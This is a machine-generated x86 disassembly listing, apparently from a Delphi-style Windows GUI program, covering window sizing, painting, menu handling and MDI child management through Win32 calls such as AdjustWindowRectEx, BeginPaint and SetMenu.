sub_4627a8
push ebx
mov ebx eax
mov eax ebx
call sub_4636c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_46283c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7d8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44f8a0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4628c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44fd7c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_42135c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421330
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403324
test al al
jne r-xdata
sub_462930
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403070
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46295c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebp
call sub_44c508
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_42135c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44fdc4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_421330
mov si 0xfff1
call sub_403324
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_42136c
jmp r-xdata
sub_4629f0
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_449194
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a198
sub_462a18
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4489c8
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_462a48
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_448a0c
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_462a78
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_448ecc
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_463bb0
pop esi
pop ebx
retn
sub_462abc
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_462b15
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462b1c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
sub_462b24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_448e80
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cd30
mov eax ebx
call sub_44cecc
sub_462b5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4211a8
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_462b9c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d1ec
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403324
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403324
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44a198
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45cc84
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4634c8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462e15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462df8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_425300
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42517c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45e16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462dff
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425300
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_45cc84
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4634c8
call sub_44f7d8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_462f43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462f1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462eff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_425300
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42517c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f06
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425300
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_44f7d8
mov esi eax
sub_462f23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
sub_462fd4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_463020
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4634fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_463548
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_463060
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_46322e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424a6c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d48c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_448af0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4478c0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_462fd4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424a6c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_4634fc
test eax eax
je r-xdata
push ebp
call sub_462fd4
pop ecx
push ebp
call sub_462fd4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_463020
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_460304
jmp r-xdata
sub_463240
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_461508
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4632ac
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_461ba4
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_42135c
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44c5fc
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_44f7d8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_421330
call sub_45d7c8
mov edx esi
mov eax ebx
call sub_421330
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_463344
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4633c1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4633cc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44cd78
sub_4633f8
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44cd78
xor edx edx
jmp r-xdata
mov eax esi
call sub_461684
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_463430
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_448788
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44cd78
sub_463474
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_448894
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4634c8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_445e0c
sub_4634fc
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46706c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_467058
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_463548
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46706c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467058
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_463598
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4185a4
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4635c8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_44f7d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46703c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46703c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_463598
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46703c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467028
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418700
call sub_403128
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467028
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467028
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_467028
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4636cc
push ebx
mov ebx eax
mov eax ebx
call sub_4636c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42b0e8
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4636f4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44cd30
mov dl 0x1
mov eax esi
call sub_463a58
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_463ad4
mov edx eax
mov eax esi
call sub_44914c
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44cecc
mov dl 0x1
mov eax esi
call sub_462a78
sub_463774
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_44f7d8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_459dc4
mov edi eax
mov eax ebp
call sub_44f7d8
push eax
call DrawMenuBar
sub_4637f0
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_420e08
xor edx edx
mov eax ebx
call sub_45b75c
sub_463814
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_463774
mov eax edx
mov edx ebx
call sub_420e08
sub_46383c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463a02
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46706c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45d310
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467058
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_420e08
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467058
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
mov eax ebx
call sub_44fadc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_463774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463a09
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
mov dl 0x1
mov eax ebx
call sub_464900
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
